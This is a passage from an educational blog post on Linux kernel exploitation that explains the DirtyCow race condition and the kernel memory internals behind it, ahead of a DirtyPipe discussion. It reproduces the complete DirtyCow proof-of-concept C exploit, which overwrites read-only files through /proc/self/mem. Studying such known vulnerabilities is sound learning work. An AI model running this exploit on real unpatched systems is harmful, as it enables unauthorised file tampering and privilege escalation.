title = "Learning Linux kernel exploitation - Part 2 - CVE-2022-0847"
description = "Continuing to walk down Linux Kernel exploitation lane. This time around with an unanticipated topic: DirtyPipe as it actually nicely fits the series as an example."
full_description = '''Exploitation Learning Linux kernel exploitation - Part 2 - CVE-2022-0847 Continuing to walk down Linux Kernel exploitation lane. This time around with an unanticipated topic: DirtyPipe as it actually nicely fits the series as an example. Published 9 May 2022 50 min read By 0x434b Table fo contents The recent appearance of CVE-2022-0847 aka DirtyPipe made the topic of this second part of this series a no-brainer: The vulnerability is not an artificially constructed one like before (read: it has impact), it was delivered with a very detailed PoC (thanks Max K!) and it's related to an older heavily popular vulnerability, dubbed CVE-2016-5195 aka DirtyCow. Again, a perfect training environment IMO. With that out of the way… This post will quickly recap what DirtyCow was all about and then dive into the details of DirtyPipe! The goal is to understand both of these vulnerabilities, how they're related and if we can apply any knowledge we gained from part 1. As always, here is the disclaimer that this post is mostly intended to help me grasp more concepts of Linux kernel exploitation. It will likely have a significant overlap with the original PoC and by the time I'm done with this article also with n other blog posts. With that out of the way let's travel back to the year 2016 when CVE-2016-5195 was discovered and made quite some buzz.Backward to year 2016 – DirtyCowDirtyCow was roughly 6 years ago, which feels ancient already since the last 3 years just flew by due to what happened in the world (so they don't really count do they x.x?)… Anyhow, what DirtyCow was all about was a race condition in the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. The bug fix itself happened in this commit:This is an ancient bug that was actually attempted to be fixed once (badly) by me eleven years ago [...] but that was then undone due to problems on s390 [...]. [...] the s390 situation has long been fixed. [...] Also, the VM has become more scalable, and what used a purely theoretical race back then has become easier to trigger. To fix it, we introduce a new internal FOLL_COW flag to mark the "yes, we already did a COW" rather than play racy games with FOLL_WRITE [...], and then use the pte dirty flag to validate that the FOLL_COW flag is still valid.The commit message is a rollercoaster of emotions. Apparently, this bug was known more than a decade before it was publicly disclosed. There was an attempted fix, which at the time didn't work for IBM resulting in that the original patch was reverted. They ended up patching IBM's s390 arch separately leaving the issue present on all other systems. Why was it handled the way it was handled? The comment about virtual memory having become "more scalable" gives some insight. A few years before this race condition seems to have been purely theoretical but with advancement in technology, especially computational speed in this case it no longer was a purely theoretical race. Let's take the original PoC and briefly walk through it:void *map; int f; struct stat st; char *name; void *madviseThread(void *dont_care) { int c = 0; for(int i = 0; i < 100000000; i++) { /* * You have to race madvise(MADV_DONTNEED) * -> https://access.redhat.com/security/vulnerabilities/2706661 * This is achieved by racing the madvise(MADV_DONTNEED) system call * while having the page of the executable mmapped in memory. */ c += madvise(map, 100, MADV_DONTNEED); } printf("madvise %d\n\n", c); } void *procselfmemThread(void *arg) { char *str = (char*) arg; /* * You have to write to /proc/self/mem * -> https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16 * The in the wild exploit we are aware of doesn't work on Red Hat * Enterprise Linux 5 and 6 out of the box because on one side of * the race it writes to /proc/self/mem, but /proc/self/mem is not * writable on Red Hat Enterprise Linux 5 and 6. */ int f = open("/proc/self/mem", O_RDWR); int c = 0; for(int i = 0; i < 100000000; i++) { // You have to reset the file pointer to the memory position. lseek(f, (uintptr_t) map, SEEK_SET); c += write(f, str, strlen(str)); } printf("procselfmem %d\n\n", c); } int main(int argc, char **argv) { // You have to pass two arguments. File and Contents. if (argc < 3) { fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content"); return 1; } pthread_t pth1, pth2; // You have to open the file in read only mode. f = open(argv[1], O_RDONLY); fstat(f, &st); name = argv[1]; /* * You have to use MAP_PRIVATE for copy-on-write mapping. * Create a private copy-on-write mapping. * Updates to the mapping are not visible to other processes mapping the same * file, and are not carried through to the underlying file. * It is unspecified whether changes made to the file after the * mmap() call are visible in the mapped region. */ // You have to open with PROT_READ. map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); printf("mmap %zx\n\n",(uintptr_t) map); // You have to do it on two threads. pthread_create(&pth1, NULL, madviseThread, argv[1]); // target_file pthread_create(&pth2, NULL, procselfmemThread, argv[2]); // new_content // You have to wait for the threads to finish. pthread_join(pth1, NULL); pthread_join(pth2, NULL); return 0; }PoC – mainStarting from main, we can see that opening our input file as O_RDONLY takes place. We then go ahead and map the file somewhere onto the heap with read-only pages. The gimmick we're attempting to abuse is the private mapping, which according to the mmap man page creates a “private copy-on-write mapping”. What's even more relevant follows on the man page: Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file. It is unspecified whether changes made to the file after the mmap call are visible in the mapped region.This in turn means that any writing attempts (PROT_READ aside here) to the mapped file should never reach the opened file. Any write attempt should create a copy of the file, which is then modified. Such a private mapping is useful for processing (e.g.: parse) files in places without having to back propagate any changes/computation results to it. Following that, two threads are started, each with a different start routine, which we'll tackle next. Notable here is that pth1 gets the target_file name (that has been mmaped) as an argument, whereas pth2 gets the new_content. PoC - madviseThreadThis small function takes the target file as its sole argument (which it doesn't end up using) and then establishes racer number one. All that is being done here is a call to int madvise(void addr, size_t length, int advice). The man page defines the job of this system call as “…madvise is used to give advice or directions to the kernel about the [given] address range, […] so that the kernel can choose appropriate read-ahead and caching techniques”. Back in the madviseThread function we can see that we're providing madvise with the mapped target file, a hard-coded length argument of 0x64 and the advice MADV_DONTNEED. This advice basically tells the kernel that we do not expect any memory accesses for the specified range in the near future. Hand in hand with that expectation the kernel is allowed to free any resources associated with this memory range! What's really relevant now is that we're still allowed to access this very memory and the behavior is by no means undefined. Any access will result in either repopulating the memory contents from the up-to-date contents of the underlying mapped file or zero-fill-on-demand pages for anonymous private mappings. To not be affected by optimizations we just add up the return codes of this system call.PoC - procselfmemThreadAnother small function that establishes the other race competitor. In here we're opening /proc/self/mem with read-write permissions. The /proc file system is a pseudo file system, which provides an interface to kernel data structures. Access to the pseudo file /proc/self/mem allows raw access to the virtual address space through open, read, lseek, and write. So, within that loop for each iteration we're resetting the file pointer of our pseudo file to the region where our mapped target file resides so that we're able to write to the very same location every time. The write call then attempts to write the provided “new_content” (arg) to it. Remember that our mapped target file is marked as COW, so as a result, this will trigger a copy of the memory to apply these changes we're requesting here.ExploitationWhat we have seen above should under no circumstances lead to any faulty behavior. Executing these threads once or in an isolated (separated) context from each other should not be a problem either. However, these threads are forced to each run their loop 100 million times. So eventually, the system trips and the kernel ends up doing the write to the actual file and not to the copy of it that should have been prepared for file writes… To fully understand why that happens let's quickly review some kernel code. Let's start with the loop to madvise. The relevant call graph for our purposes looks roughly like this: │ │ unsigned long start, size_t len_in, int behavior │ ▼ ┌───────┐ │madvise│ └───┬───┘ │ │ vm_area_struct *vma, vm_area_struct **prev, unsigned long start, unsigned long end, int behavior ▼ ┌───────────┐ │madvise_vma│ └───┬───────┘ │ │ vm_area_struct *vma, vm_area_struct **prev, unsigned long start, unsigned long end ▼ ┌────────────────┐ │madvise_dontneed│ └───┬────────────┘ │ │ vm_area_struct *vma, unsigned long start, unsigned long size, zap_details *details ▼ ┌──────────────┐ │zap_page_range│ └───┬──────────┘ │ │ ┌──────────────┐ ┌────────────────┐ ┌──────────────┐ └─►│tlb_gather_mmu├─►│unmap_single_vma├─►│tlb_finish_mmu│--> ... └──────────────┘ └────────────────┘ └──────────────┘The first half yields the expected arguments. Our initial arguments to madvise are converted to something the kernel can work with: VMA structs, which are a complex per process structure that defines, and holds information about the virtual memory that is being operated on. Eventually, within madvise_vma we reach a switch-case statement that redirects control to madvise_dontneed. By the time we reach this code the kernel assumes that the calling application no longer needs the associated pages that come with start_mem and end_mem. Even in case of the pages being dirty it is assumed that getting rid of the pages and freeing resources is valid. To go through with that plan zap_page_range is called, which basically just removes user pages in the given range. What is now relevant here is that it also before the actual unmapping takes places sets out to tear down the corresponding page-table entries. Let's shortly recap on (virtual) memory management and page tables.Detour: (Virtual) memory managementThe gist of virtual memory is that it makes the system appear to have more memory than it actually has. To achieve that, it shares memory between all running and competing processes. Moreover, utilizing a virtual memory space allows for each process to run in its own virtual address space. These virtual address spaces are completely separate from each other and so a process running one application typically cannot affect another. Furthermore, as the used memory by processes is now virtual it can be moved or even swapped to disk. This leaves us with a physical address space (used by the hardware) and a virtual address space (used by software). These concepts require some managing and coordination. Here the Memory Management Unit, or short MMU comes into play. The MMU sits between the CPU core(s) and memory and most often is part of the physical CPU itself. While the MMU is mapping virtual addresses to physical ones, it's operating on basic units of memory, so-called pages. These page sizes vary by architecture, and we've just seen that the page size for x86 is 4K bytes. Often times we also find the terminology of a page frame, which refers to a page-sized and page-aligned physical memory block. Now the concept of shared memory is easily explainable. Just think of two processes needing the same system-wide GLIBC. There's really no need to have it mapped twice in physical memory. The virtual address space of each of the two processes can just contain an entry at even arbitrary virtual addresses that ultimately translate to the physical address space containing the loaded GLIBC. Traditionally, on Linux the user space occupies the lower majority of the virtual address space allocated for a process. Higher addresses get mapped to kernel addresses. +-------------------------+ 0xffff_7fff_ffff_ffff | | | | | Kernel addresses | | | | | 0x0000_8000_0000_0000 +-------------------------+ | | 0x0000_7fff_ffff_ffff | | | | | | | | | Userspace addresses | | | | | | | | | | | | | | | +-------------------------+ 0x0000_0000_0000_0000We can easily verify this by using a debugger on any arbitrary program and check the virtual mappings:vmmap on /usr/bin/gitAs we can see, we have several userland virtual memory addresses mapped for the currently debugged git binary. There's only one mapping for kernel memory vsyscall, which is a mechanism used to accelerate certain system calls that do not need any real level of privilege to run to reduce the overhead induced by scheduling and executing a system call in the kernel. A detailed memory mapping can be found in the official kernel documentation. Since the MMU and ultimately the kernel needs to keep track of all the mappings at all times it requires a way to store these meta information reliably. Here page tables come into play. For simplicity let's first assume we have a 32-bit virtual and physical address space and just a single page table for now. We keep the page size of 4k bytes as defined in the Linux kernel:PAGE_SIZE = 1 << 12 == 4096A simple page table may look like this: Virtual page number Page offset +------------------------------------------------------+---------------------+ | | | | 20 bits | 12 bits | | | | +-------------------------+----------------------------+------------+--------+ | | +----------------+ | | | | +---------------------------------------+ | | | PTE PPN | | | | +---------------+ | | | | 0x00000 ----> | 0x00000 | | | | | +---------------+ | | | | 0x00001 ----> | DISK | | | | | +---------------+ | | +-------->| 0x00002 ----> | 0x00008 | | | 4kB offset | +---------------+ | | | | | | | | | ... | | | | +---------------+ | | | 0xFFFFF ----> | 0x000FC | | | | +---------------+ | | | | | +---------------+-----------------------+ | | | | | v v +------------------------------------------------------+----------------------+ | | | | 20 bits | 12 bit | | | | +------------------------------------------------------+----------------------+ Physical page number Page offsetSimple page table translation example with PTE being a Page Table Entry, and PPN being a Physical Page NumberThe top dep'''
